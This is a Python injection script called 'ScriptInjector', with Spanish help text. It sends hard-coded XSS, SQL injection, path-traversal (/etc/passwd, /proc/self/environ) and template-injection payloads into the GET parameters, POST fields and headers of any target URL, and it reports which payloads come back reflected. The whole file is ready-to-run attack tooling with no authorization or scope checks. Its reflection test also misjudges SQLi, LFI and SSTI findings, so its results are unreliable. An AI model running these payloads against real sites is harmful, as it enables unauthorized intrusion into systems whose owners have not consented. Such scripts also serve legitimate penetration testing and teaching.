import requests
import argparse
import urllib.parse
import re
from colorama import Fore, Style

# Payloads por tipo
PAYLOADS = {
    "XSS": ["<script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>"],
    "SQLi": ["' OR '1'='1", "\" OR \"1\"=\"1", "' UNION SELECT NULL--"],
    "LFI": ["../../../../etc/passwd", "/proc/self/environ", "../../../../boot.ini"],
    "SSTI": ["{{7*7}}", "${7*7}", "{7*7}"]
}

def inject_get(url, payloads):
    vulnerable = []
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)

    for param in query:
        for payload in payloads:
            new_query = query.copy()
            new_query[param] = payload
            encoded_query = urllib.parse.urlencode(new_query, doseq=True)
            new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{encoded_query}"

            try:
                resp = requests.get(new_url, timeout=5)
                if payload in resp.text:
                    print(f"{Fore.GREEN}[+] Reflected {payload} in param '{param}' on {new_url}{Style.RESET_ALL}")
                    vulnerable.append((param, payload, new_url))
            except Exception as e:
                print(f"{Fore.RED}[-] Error on GET request: {e}{Style.RESET_ALL}")
    return vulnerable

def inject_post(url, data_template, payloads):
    vulnerable = []
    for param in data_template:
        for payload in payloads:
            data = data_template.copy()
            data[param] = payload
            try:
                resp = requests.post(url, data=data, timeout=5)
                if payload in resp.text:
                    print(f"{Fore.YELLOW}[+] Reflected {payload} in POST param '{param}' on {url}{Style.RESET_ALL}")
                    vulnerable.append((param, payload, url))
            except Exception as e:
                print(f"{Fore.RED}[-] Error on POST request: {e}{Style.RESET_ALL}")
    return vulnerable

def inject_headers(url, headers_template, payloads):
    vulnerable = []
    for header in headers_template:
        for payload in payloads:
            headers = headers_template.copy()
            headers[header] = payload
            try:
                resp = requests.get(url, headers=headers, timeout=5)
                if payload in resp.text:
                    print(f"{Fore.CYAN}[+] Reflected {payload} in header '{header}' on {url}{Style.RESET_ALL}")
                    vulnerable.append((header, payload, url))
            except Exception as e:
                print(f"{Fore.RED}[-] Error on header injection: {e}{Style.RESET_ALL}")
    return vulnerable

def main():
    parser = argparse.ArgumentParser(description="ScriptInjector - Inyección de payloads en múltiples vectores")
    parser.add_argument("url", help="URL objetivo (con parámetros si es GET)")
    parser.add_argument("-m", "--mode", choices=["get", "post", "header", "all"], default="get", help="Modo de inyección")
    parser.add_argument("-t", "--type", choices=PAYLOADS.keys(), nargs="+", default=["XSS"], help="Tipo(s) de ataque")
    parser.add_argument("-d", "--data", help="Datos POST (param1=val1&param2=val2)")
    args = parser.parse_args()

    payloads = [p for t in args.type for p in PAYLOADS[t]]
    print(f"{Fore.BLUE}[*] Ejecutando inyecciones en modo {args.mode} con payloads de tipo: {args.type}{Style.RESET_ALL}")

    if args.mode in ["get", "all"]:
        inject_get(args.url, payloads)

    if args.mode in ["post", "all"] and args.data:
        data_dict = dict(urllib.parse.parse_qsl(args.data))
        inject_post(args.url, data_dict, payloads)

    if args.mode in ["header", "all"]:
        headers = {"User-Agent": "ScriptInjector", "X-Custom-Test": "test"}
        inject_headers(args.url, headers, payloads)

if __name__ == "__main__":
    main()
